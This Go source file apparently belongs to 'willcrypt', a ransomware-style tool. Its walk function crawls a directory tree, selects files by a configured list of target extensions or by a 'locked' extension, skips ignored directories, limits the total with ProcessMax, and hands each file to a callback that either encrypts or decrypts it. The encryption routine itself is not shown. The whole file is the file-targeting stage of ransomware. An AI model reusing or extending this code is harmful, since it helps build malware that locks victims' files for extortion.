package main

import (
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"

	"github.com/sywc670/willcrypt/internal/config"
	"github.com/sywc670/willcrypt/pkg/gowalk"
)

func walk(startDir string, wg *sync.WaitGroup, fn func(string, bool)) {
	var count int32

	filter := func(filePath string, args ...any) {
		defer wg.Done()
		var proceed bool
		isEncrypted := strings.HasSuffix(filePath, config.LockedExtension)

		// Only work on config.Extensions or locked.
		for _, ext := range config.Extensions {
			if strings.HasSuffix(filePath, ext) || isEncrypted {
				proceed = true
				break
			}
		}

		if !c.IsDecode && isEncrypted {
			debugf("%s already locked, can't encode anymore.\n", filePath)
			return
		}

		if c.IsDecode && !isEncrypted {
			debugf("%s not locked, can't decode anymore.\n", filePath)
			return
		}

		for _, dir := range config.IgnoreDirs {
			if strings.Contains(filepath.Dir(filePath), dir) {
				return
			}
		}

		if proceed && count < config.ProcessMax {
			atomic.AddInt32(&count, 1)
			fn(filePath, isEncrypted)
		}

	}

	gowalk.Walk(startDir, wg, filter)
}
